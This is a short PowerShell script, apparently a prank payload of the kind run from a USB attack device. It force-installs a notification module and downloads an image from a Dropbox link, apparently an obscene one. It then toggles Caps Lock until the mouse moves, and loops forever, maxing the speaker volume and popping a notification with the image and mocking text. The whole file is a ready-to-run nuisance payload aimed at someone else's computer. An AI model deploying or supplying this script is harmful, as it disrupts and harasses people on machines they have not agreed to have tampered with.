function install{
    Install-Module BurntToast -Force
    $image =  "https://www.dropbox.com/s/xdrxfnl5t8z0iec/dick.jpg"
    $i = -join($image,"?dl=1")
    iwr $i -O $env:TMP\i.png

}

function Pause-Script{
Add-Type -AssemblyName System.Windows.Forms
$originalPOS = [System.Windows.Forms.Cursor]::Position.X
$o=New-Object -ComObject WScript.Shell

    while (1) {
        $pauseTime = 3
        if ([Windows.Forms.Cursor]::Position.X -ne $originalPOS){
            break
        }
        else {
            $o.SendKeys("{CAPSLOCK}");Start-Sleep -Seconds $pauseTime
        }
    }
}


Function alert {
while($True)
{
    $sb = Start-Job -ScriptBlock{
        Function Set-Speaker($Volume){$wshShell = new-object -com wscript.shell;1..50 | % {$wshShell.SendKeys([char]174)};1..$Volume | % {$wshShell.SendKeys([char]175)}}
        Set-Speaker -Volume 50
        New-BurntToastNotification -AppLogo $env:TMP\i.png -Text "JAJAJAJAJAJ"
        Start-Sleep -Seconds 1
    }
    Wait-Job $sb.Name
}
}

install
Pause-Script
alert
